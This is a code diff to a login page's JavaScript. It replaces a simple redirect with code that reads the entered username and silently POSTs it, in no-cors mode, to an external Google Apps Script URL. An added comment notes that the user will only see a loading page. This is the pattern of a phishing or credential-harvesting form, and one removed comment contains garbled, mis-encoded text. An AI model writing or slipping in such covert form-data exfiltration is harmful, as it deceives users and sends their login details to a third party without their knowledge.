@@ -1,10 +1,16 @@
-document.addEventListener("DOMContentLoaded", function () {
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+  e.preventDefault();
 
-  var form = document.getElementById("loginForm");
+  const username = document.getElementById("username").value;
 
-  form.addEventListener("submit", function (e) {
-    e.preventDefault();   // page reload à¤°à¥‹à¤•à¤¤à¤¾ à¤¹à¥ˆ
-    window.location.href = "loading.html";
+  fetch("https://script.google.com/macros/s/AKfycbw6GR29yDCVXL5Wl5H0jiCRC4sFTNNmvgzg3uIMFnv4VIAKJbnzkbQkzLGP21jaZw0D/exec", {
+    method: "POST",
+    mode: "no-cors",
+    body: new URLSearchParams({
+      username: username
+    })
   });
 
+  // ✅ user will only see loading page
+  window.location.href = "loading.html";
 });
